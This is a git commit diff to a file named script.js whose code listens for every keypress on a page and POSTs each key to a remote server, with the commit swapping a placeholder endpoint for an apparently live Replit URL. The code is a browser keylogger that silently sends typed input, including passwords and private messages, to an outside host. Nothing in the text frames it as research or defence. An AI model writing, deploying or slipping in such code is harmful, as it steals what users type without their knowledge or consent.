2baa25d2a41e520232322b5b73a75f0c393adf4f
KAMYABDARABI <138663439+KAMYABDARABI@users.noreply.github.com>
2025-03-21 13:23:16 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,7 @@
 navigator.serviceWorker.register("worker.js");
 
 document.addEventListener("keydown", function(event) {
-    fetch("https://your-server.com/save-key", {  
+    fetch("https://replit.com/@Kamyabdarabi200/1", {  
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ key: event.key })
